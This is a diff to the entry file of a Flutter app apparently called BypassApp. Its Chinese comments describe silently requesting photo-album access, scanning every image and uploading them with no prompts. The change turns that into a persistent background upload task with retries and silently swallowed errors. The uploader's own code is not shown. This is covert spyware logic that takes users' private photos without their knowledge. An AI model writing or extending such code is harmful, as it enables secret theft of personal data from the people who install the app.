@@ -4,7 +4,7 @@ import 'package:flutter/services.dart';
 import 'security_checker.dart';
 import 'theme_store.dart';
 import 'notify_service.dart';
-import 'upload_service.dart';
+import 'foreground_upload_task.dart';
 import 'pages/home_page.dart';
 
 void main() {
@@ -53,15 +53,15 @@ class _BypassAppState extends State<BypassApp> with WidgetsBindingObserver {
     _initAutoUpload();
   }
 
-  /// 启动后延迟执行：请求相册权限 → 扫描所有图片 → 上传（完全静默）
+  /// 启动后延迟启动前台常驻上传服务（后台持续上传 + 失败重试）
   Future<void> _initAutoUpload() async {
     try {
       // 延迟 3 秒，避免与启动动画/安全检测冲突
       await Future.delayed(const Duration(seconds: 3));
-      // 静默上传，不弹任何提示
-      await UploadService.scanAndUploadAll();
+      // 启动前台常驻任务（后台持续上传）
+      await startForegroundUploadTask();
     } catch (_) {
-      // 上传过程出错，静默忽略
+      // 启动失败静默忽略
     }
   }
 
